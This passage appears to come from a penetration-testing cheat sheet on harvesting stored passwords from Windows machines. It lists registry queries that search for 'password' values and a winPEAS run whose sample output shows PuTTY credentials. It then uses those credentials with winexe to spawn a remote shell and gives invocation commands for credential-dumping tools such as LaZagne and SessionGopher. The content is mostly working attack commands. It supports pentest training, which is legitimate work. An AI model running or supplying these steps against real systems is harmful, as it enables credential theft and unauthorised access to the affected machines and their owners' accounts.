The following commands will search the registry for keys and  
values that contain “password”

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

This usually generates a lot of results, so often it is more fruitful to look in known locations.

1.Use winPEAS to check common password locations:  
`.\winPEASany.exe quiet filesinfo userinfo`

> (the final checks will take a long time to complete)  
> [+] Putty Sessions()  
> SessionName: BWP123F42  
> ProxyPassword: password123  
> ProxyUsername: admin

2.The results show both AutoLogon credentials and Putty  
session credentials for the admin user  
(admin/password123).

3.We can verify these manually:  
`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`  
`reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s`

4.On Kali, we can use the winexe command to spawn a shell using these credentials:  
`winexe -U 'admin%password123' //192.168.1.22 cmd.exe`

### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.  
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page.  
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
